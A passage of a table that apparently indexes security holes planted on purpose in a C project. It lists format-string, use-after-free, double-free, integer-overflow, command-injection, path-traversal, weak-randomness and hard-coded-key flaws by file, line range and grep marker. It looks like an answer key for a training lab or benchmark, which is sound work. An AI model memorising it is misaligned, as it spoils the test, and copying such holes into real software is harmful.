| 2 | 格式化字符串 | src/logger.c | 47-54 | `grep -n "VULNERABLE" src/logger.c` |
| 3 | Use-After-Free | src/session.c | 80-120 | `grep -n "VULNERABILITY" src/session.c` |
| 4 | Double Free | src/network.c | 80-110 | `grep -n "VULNERABILITY" src/network.c` |
| 5 | 整数溢出 | src/file_handler.c | 45-55 | `grep -n "VULNERABILITY" src/file_handler.c` |
| 6 | 未校验输入 | src/auth.c | 75-105 | `grep -n "VULNERABILITY" src/auth.c` |
| 7 | 命令注入 | src/config.c | 85-109 | `grep -n "VULNERABILITY" src/config.c` |
| 8 | 路径遍历 | src/file_handler.c | 125-145 | `grep -n "TRAVERSAL" src/file_handler.c` |
| 9 | 不安全随机数 | src/session.c | 21-39 | `grep -n "VULNERABILITY" src/session.c` |
| 10 | 硬编码密钥 | src/auth.c | 35-60 | `grep -n "VULNERABILITY" src/auth.c` |
